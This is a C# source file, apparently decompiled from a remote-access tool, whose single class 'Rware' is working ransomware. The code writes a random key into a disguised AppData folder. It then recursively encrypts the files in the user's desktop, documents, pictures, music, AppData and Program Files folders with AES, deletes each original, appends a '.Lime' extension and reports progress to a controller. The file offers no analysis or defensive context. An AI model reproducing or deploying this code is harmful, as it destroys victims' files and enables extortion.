using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Lime;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

public class Rware
{
	private object ext;

	private string keycrypt;

	public Rware()
	{
		ext = ".Lime";
		keycrypt = Conversions.ToString(RandomString(50));
	}

	public void GenKey()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!Directory.Exists(folderPath + "\\Microsoft\\MMC"))
		{
			Directory.CreateDirectory(folderPath + "\\Microsoft\\MMC");
		}
		File.WriteAllText(folderPath + "\\Microsoft\\MMC\\hash", keycrypt);
		Launch_crypt();
	}

	public object RandomString(object size)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnop";
		Random random = new Random();
		string text2 = "";
		int num = Conversions.ToInteger(size);
		for (int i = 1; i <= num; i = checked(i + 1))
		{
			int startIndex = random.Next(0, Strings.Len(text));
			text2 += text.Substring(startIndex, 1);
		}
		return text2;
	}

	public object Launch_crypt()
	{
		Core.Send("MSG" + Core.Y + "Ransomware: It might take some time, Please Wait..");
		string myPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\";
		Work_File(myPath);
		Core.Send("MSG" + Core.Y + "Ransomware: %50 left...");
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\";
		Work_File(myPath);
		Core.Send("MSG" + Core.Y + "Ransomware: %80 left...");
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\";
		Work_File(myPath);
		myPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent) + "\\";
		Work_File(myPath);
		File.Create(Path.GetTempPath() + "done.LE");
		Core.Send("MSG" + Core.Y + "Ransomware: All files have been encrypted");
		return true;
	}

	public object Work_File(string MyPath)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = folderPath2 + "\\desktop.ini";
		checked
		{
			try
			{
				int num = ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyPath).Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if ((Operators.CompareString(((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyPath)[i], Application.get_ExecutablePath(), false) != 0) & (Operators.CompareString(((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyPath)[i], folderPath + "\\Microsoft\\MMC\\hash", false) != 0) & (Operators.CompareString(((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyPath)[i], text, false) != 0))
					{
						Crypt(((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyPath)[i], keycrypt);
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyPath)[i]);
					}
				}
				int num2 = ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(MyPath).Count - 1;
				for (int i = 0; i <= num2; i++)
				{
					Work_File(((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(MyPath)[i]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			string[] result = default(string[]);
			return result;
		}
	}

	public object Crypt(object file, object key)
	{
		byte[] input = File.ReadAllBytes(Conversions.ToString(file));
		File.WriteAllBytes(Conversions.ToString(Operators.AddObject(file, ext)), AES_Encrypt(input, Conversions.ToString(key)));
		object result = default(object);
		return result;
	}

	public byte[] AES_Encrypt(byte[] input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			byte[] array2 = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			result = array2;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
